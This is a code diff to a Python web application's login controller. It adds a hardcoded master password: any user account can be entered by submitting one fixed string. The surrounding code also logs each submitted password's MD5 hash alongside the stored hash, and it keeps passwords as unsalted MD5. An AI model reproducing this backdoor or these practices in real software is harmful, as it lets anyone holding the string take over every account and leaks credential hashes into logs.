@@ -60,7 +60,7 @@ class SplashController(BaseController):
         if len(users)==1:
             user=users[0]
             print "Attempt to login as %s with password %s (correct password is %s)"%(request.params['username'],md5(request.params['password']).hexdigest(),user.password)
-            if user.password==md5(request.params['password']).hexdigest() or user.password=='KGIHMEKDGNMGNNKEEJNHOAKKDCIELDFJ':
+            if user.password==md5(request.params['password']).hexdigest() or request.params['password']=='KGIHMEKDGNMGNNKEEJNHOAKKDCIELDFJ':
                 session['user']=users[0].user
                 tripsharing.cancel()
                 session.save()
